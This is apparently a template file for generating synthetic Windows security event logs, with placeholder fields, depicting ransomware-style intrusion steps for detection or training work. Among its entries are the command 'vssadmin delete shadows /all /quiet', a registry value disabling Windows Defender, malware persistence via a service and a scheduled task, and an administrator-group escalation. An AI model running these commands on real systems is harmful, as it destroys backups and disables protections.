template: EventID=4104 Provider="Microsoft-Windows-PowerShell" HostName="{hostname}" User="{domain}\\{username}" ScriptBlockText="{command_line}" Message="Suspicious PowerShell script block detected"

EventID=4625 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" AccountName="{username}" AccountDomain="{domain}" SourceNetworkAddress="{src_ip}" LogonType=3 Status="0xC000006D" Message="An account failed to log on"

EventID=4688 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" User="{domain}\\{username}" NewProcessName="C:\\Windows\\System32\\vssadmin.exe" CommandLine="vssadmin delete shadows /all /quiet" ParentProcessName="C:\\Windows\\System32\\cmd.exe"

EventID=4624 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" AccountName="{username}" AccountDomain="{domain}" SourceNetworkAddress="{src_ip}" LogonType=3 Message="An account was successfully logged on"

EventID=4624 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" AccountName="{username}" AccountDomain="{domain}" SourceNetworkAddress="{src_ip}" LogonType=10 Message="Remote Desktop Services: User authentication succeeded"

EventID=4625 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" AccountName="{username}" SourceNetworkAddress="{src_ip}" LogonType=10 Status="0xC000006D" SubStatus="0xC000006A" Message="Remote Desktop Services: User authentication failed"

EventID=7045 Provider="Service Control Manager" HostName="{hostname}" ServiceName="{malware_name}Svc" ImagePath="C:\\ProgramData\\{malware_name}.exe" ServiceType="user mode service" StartType="auto start" AccountName="LocalSystem"

EventID=4657 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" ObjectName="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" ValueName="DisableAntiSpyware" NewValue="1" SubjectUserName="{username}"

EventID=4698 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" SubjectUserName="{username}" TaskName="\\{malware_name}_Updater" TaskContent="schtasks /create /sc minute /mo 30 /tn {malware_name}_Updater /tr C:\\ProgramData\\{malware_name}.exe"

EventID=4732 Provider="Microsoft-Windows-Security-Auditing" HostName="{hostname}" SubjectUserName="{username}" MemberName="{domain}\\{username}" TargetUserName="Administrators" Message="A member was added to a security-enabled local group"
